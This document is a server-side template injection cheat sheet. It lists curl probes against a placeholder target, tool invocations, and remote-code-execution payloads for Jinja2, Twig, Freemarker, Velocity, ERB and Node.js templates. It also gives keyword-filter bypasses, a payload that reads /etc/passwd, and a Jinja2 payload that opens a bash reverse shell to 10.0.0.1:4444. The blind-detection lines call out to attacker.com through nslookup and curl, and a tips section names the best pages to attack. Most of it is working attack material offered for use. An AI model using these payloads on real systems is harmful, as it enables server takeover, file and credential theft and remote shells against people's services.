#### 1. BASIC DETECTION
# Generic SSTI Detection
curl -X POST "http://target.com/render" -d 'template=<%= 7*7 %>'
curl "http://target.com/profile?name=${7*7}"

# Math-based detection (Polyglot)
curl "http://target.com/search?q={{7*'7'}}"  # Returns 49?
curl "http://target.com/display?content=${"z".join("ab")}"  # Returns "azb"?

#### 2. AUTOMATED TOOLS
# Tplmap (Multi-framework)
python tplmap.py -u 'http://target.com/page?name=John'

# SSTI Scanner (Burp Extension)
# Available in BApp Store

# Nuclei Templates
nuclei -t templates/ssti/ -u http://target.com

#### 3. FRAMEWORK-SPECIFIC EXPLOITATION
# Jinja2 (Python)
{{ config.items() }}  # Dump config
{{ ''.__class__.__mro__[1].__subclasses__()[408]('whoami',shell=True,stdout=-1).communicate() }}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Velocity (Java)
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))

#### 4. RCE PAYLOADS
# Python (Sandbox Escape)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Ruby (ERB)
<%= system('cat /etc/passwd') %>

# JavaScript (Node.js)
{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}

#### 5. BYPASS TECHNIQUES
# Character Filters
${"${7*7}"}  # Nested evaluation
{{'7'*7}}    # Alternative syntax

# Keyword Blacklists
{{request|attr('application')|attr('__globals__')}}  # Attribute access
{{''['__class__']['__base__']}}  # Dictionary access

# Hex/Octal Encoding
{{'\x5f\x5fclass\x5f\x5f'}}  # Hex for "__class__"

#### 6. POST-EXPLOITATION
# File Read
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Reverse Shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read()}}

# Environment Dump
{{self.__dict__._TemplateReference__context}}

#### 7. BLIND DETECTION
# Time-based
curl "http://target.com/render?template={{sleep(5)}}"

# DNS Exfiltration
curl "http://target.com/profile?name={{system('nslookup attacker.com')}}"

# HTTP Request
curl "http://target.com/search?q={{system('curl attacker.com')}}"

#### PRO TIPS:
# 1. Always test:
#  - All user-controlled template inputs
#  - Different template contexts (plaintext vs code)
#  - Multiple template languages
#  - Blind detection methods

# 2. Critical targets:
#  - User profile pages
#  - Document generators
#  - Email templates
#  - Report builders

# 3. Escalation paths:
#  - Remote code execution
#  - Sensitive data exposure
#  - Authentication bypass
#  - Server compromise


# SECURITY IMPACT:
# - Successful SSTI exploitation may lead to:
# - Remote code execution
# - Complete server compromise
# - Sensitive data exposure
# - Authentication bypass
# - Server-side request forgery

# #### FRAMEWORK-SPECIFIC PAYLOADS:
# ┌─────────────┬─────────────────────────────────────────────────────┐
# │ Framework   │ Payload                                            │
# ├─────────────┼─────────────────────────────────────────────────────┤
# │ Jinja2      │ {{config.items()}}                                 │
# │ Twig        │ {{_self.env.registerUndefinedFilterCallback("exec")}│
# │ Freemarker  │ <#assign ex="freemarker.template.utility.Execute"?n │
# │ Velocity    │ #set($x='')#evaluate($x.concat('java.lang.Runtime')│
# │ Handlebars  │ {{#with "s" as |string|}}                          │
# │ Smarty      │ {system('id')}                                     │
# └─────────────┴─────────────────────────────────────────────────────┘

#### SAMPLE DETECTION SCRIPT:
```python
# ssti_detector.py
import requests

def detect_ssti(url, param):
    tests = {
        'Jinja2': '{{7*7}}',
        'Twig': '{{7*7}}',
        'Freemarker': '${7*7}',
        'Velocity': '#set($x=7*7)${x}'
    }
    
    for engine, payload in tests.items():
        r = requests.get(url, params={param: payload})
        if '49' in r.text:
            print(f"Possible {engine} SSTI vulnerability")
            return engine
    print("No SSTI detected")
    return None

detect_ssti('http://target.com/profile', 'name')
```
